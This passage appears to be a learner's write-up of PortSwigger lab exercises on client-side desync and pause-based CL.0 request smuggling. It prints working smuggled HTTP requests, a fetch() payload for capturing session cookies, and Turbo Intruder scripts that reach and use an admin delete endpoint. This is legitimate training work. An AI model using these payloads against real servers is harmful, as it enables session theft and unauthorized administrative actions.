Cookie: session=WVDND0BFXYu7YnciRsy73vyJXnRQ329N; _lab_analytics=R1FcQWmBAv2uvGlrXiB5imPoJmwk0hb2cgVliG6SpHKI14vCmGztaWSqJhUK4m2zC0rygGfQtIbzeGbH0EUGQuvXjzGKOVyY4duLXuAuqVscxnpY6axrKx1JOM67u7eufM5lu0dN9bKVjpTSid0Sc9X869DseDpQx2w1HGNZ9bCuOPB5duIP9jREPgAHe1b3niUtxpAFAYps2t8gizOfL2lkY3DdwKeyspk0e3pqCFIcAzdNSRdrMDndyeJ3oZH5
Content-Length: 230
Content-Type: x-www-form-urlencoded
Connection: keep-alive

csrf=u9Y7KVqpzNbsScWsm2tkZFLZwjmQBHs2&postId=7&name=wiener&email=wiener@web-security-academy.net&website=https://ginandjuice.shop&comment=
```


Second request
GET /capture-me HTTP/1.1
Host: 0a40001c03a43d63813c7022007d0052.h1-web-security-academy.net


Send group in sequence single connection
To find content length add the bytes of the body in response 1 and the header in response 2
138+94=230 
Content-length


![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/11e619d7-95d9-4596-9f51-c634a88cecd3)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/32288856-957e-486a-afe9-dd9ce07e253d)


confirm that you have successfully output the start of your GET /capture-me request in a comment. 

From <https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6d5034b6-b4eb-44c1-b097-5ca39c49ad2e)







**Replicating in browser**

```
fetch('https://0a40001c03a43d63813c7022007d0052.h1-web-security-academy.net', {
    method: 'POST',
    body: 'POST /en/post/comment HTTP/1.1\r\nHost: 0a40001c03a43d63813c7022007d0052.h1-web-security-academy.net\r\nCookie: session=WVDND0BFXYu7YnciRsy73vyJXnRQ329N; _lab_analytics=R1FcQWmBAv2uvGlrXiB5imPoJmwk0hb2cgVliG6SpHKI14vCmGztaWSqJhUK4m2zC0rygGfQtIbzeGbH0EUGQuvXjzGKOVyY4duLXuAuqVscxnpY6axrKx1JOM67u7eufM5lu0dN9bKVjpTSid0Sc9X869DseDpQx2w1HGNZ9bCuOPB5duIP9jREPgAHe1b3niUtxpAFAYps2t8gizOfL2lkY3DdwKeyspk0e3pqCFIcAzdNSRdrMDndyeJ3oZH5\r\nContent-Length: 230\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=u9Y7KVqpzNbsScWsm2tkZFLZwjmQBHs2&postId=7&name=wiener&email=wiener@web-security-academy.net&website=https://ginandjuice.shop&comment=',
    mode: 'cors',
    credentials: 'include',
}).catch(() => {
    fetch('https://0a40001c03a43d63813c7022007d0052.h1-web-security-academy.net/capture-me', {
    mode: 'no-cors',
    credentials: 'include'
})
})
```


Adjust content length until you get a session cookie
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/92f25204-abcf-4556-a9ea-fb53e8d29351)


Put in cookie editor and we solved the lab

**Server-side pause-based request smuggling**

Response show apache 2.4.52
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/19ef8f73-f4f4-41b6-b9b4-7f0c1e39d328)


Vulnerable to pause-based CL.0 attacks on endpoints that trigger server-level redirects

From <https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling> 



Using turbo intruder extension 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b894efdf-150e-4a3d-9561-c7f92a580b03)

Convert to post and Connection to keep-alive
Add a complete GET /admin request to the body of the main request. The result should look something like this: 

```
POST /resources HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

GET /admin/ HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```


From <https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling> 

In the Python editor panel, enter the following script. This issues the request twice, pausing for 61 seconds after the \r\n\r\n sequence at the end of the headers: 

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=500,
                           pipeline=False
                           )

    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
    engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

From <https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling> 




• Launch the attack. Initially, you won't see anything happening, but after 61 seconds, you should see two entries in the results table: 
	• The first entry is the POST /resources request, which triggered a redirect to /resources/ as normal. 
	• The second entry is a response to the GET /admin/ request. Although this just tells you that the admin panel is only accessible to local users, this confirms the pause-based CL.0 vulnerability. 

From <https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling> 

Attack

```
POST /resources HTTP/1.1
Host: 0a86002b041ca572898582b400f300ca.web-security-academy.net
Cookie: session=ZCqkF1l1ZxKKVRZxmZvRCoq0X8uPBM9D
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

GET /admin/ HTTP/1.1
Host: 0a86002b041ca572898582b400f300ca.web-security-academy.net
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a4a1e083-5e57-4775-ae9a-a5cbec5345c1)



Exploit
Changing smuggled host to localhost will redirect you to the admin panel 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6b0e63f6-2808-4d7b-a32b-559465183775)



• Study the response and observe that the admin panel contains an HTML form for deleting a given user. Make a note of the following details: 
	• The action attribute (/admin/delete). 
	• The name of the input (username). 
	• The csrf token. 

From <https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8a63194a-789d-469a-a6e6-fa3a17928209)



Exploit will look like this

```
POST /resources HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

POST /admin/delete/ HTTP/1.1
Host: localhost
Content-Type: x-www-form-urlencoded
Content-Length: CORRECT

csrf=YOUR-CSRF-TOKEN&username=carlos
```


Find the content length of our smuggled request 

`53`
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/e4cc08b2-4919-49d5-a056-25cbeb031f4a)



For our regular request replace content length of smuggled request 
`159`
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1c73ae83-af98-4178-969d-729c8a050b33)


Our turbo intruder response
```
POST /resources HTTP/1.1
Host: 0a86002b041ca572898582b400f300ca.web-security-academy.net
Cookie: session=ZCqkF1l1ZxKKVRZxmZvRCoq0X8uPBM9D
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 159

POST /admin/delete/ HTTP/1.1
Host: localhost
Content-Type: x-www-form-urlencoded
Content-Length: 53

csrf=wKNpmqwMuYIkL2nYydGPXtB4acjDLkiJ&username=carlos
```

Replaced our python with the content length
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=500,
                           pipeline=False
                           )

    engine.queue(target.req, pauseMarker=['Content-Length: 159\r\n\r\n'], pauseTime=61000)
    engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```




Deleted
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/dd9bff3a-0143-45ac-8cf4-7c674c6d85ab)






































